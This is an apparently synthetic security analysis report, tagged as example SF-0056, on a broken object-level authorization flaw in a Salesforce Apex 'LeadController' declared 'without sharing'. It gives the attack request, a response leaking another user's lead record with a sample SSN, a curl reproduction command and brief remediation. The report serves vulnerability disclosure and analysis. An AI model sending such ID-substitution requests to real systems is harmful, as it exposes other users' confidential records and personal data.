# Security Analysis Report
**System:** Aegis Vault Secure Repository (Salesforce-Integrated)
**Domain:** Defense Industrial Base / Secure Repository
**Example ID:** SF-0056
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 10.2 | Parameter escalation (own session scope extension) on `LeadController.getLeadData` — attacker reads Lead records outside their session scope |

---

## Finding 1 — BOLA: Parameter Escalation on Lead Object (Pattern 10.2)

### Summary
The Apex controller `LeadController` on Aegis Vault Secure Repository (`f483762c.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Lead object. Per §5.0 Pattern 10.2, the attacker escalates their session scope by substituting `leadId` with a victim ID they do not own. In a defense industrial base/secure repository context, Lead records may represent contractor/vendor access profiles, procurement leads, and classified procurement PII.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getLeadDetails(String leadId, ...)` while the Aura descriptor in §6.0 is `c.LeadController.getLeadData`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 10.2 — Parameter escalation (own session scope extension)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://f483762c.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://f483762c.lightning.force.com/aura
Authorization: Bearer 00DF483762C!ARf483762c...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DF483762C!ARf483762c...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN",
"params":{"leadId":"001762C","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Lead Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001762C", "Name": "Victim Lead Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-19-8477"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DF483762C!ARf483762c..."
curl -s -X POST "https://f483762c.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"001762C","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-19-8477
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class LeadController { ... }`
2. `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
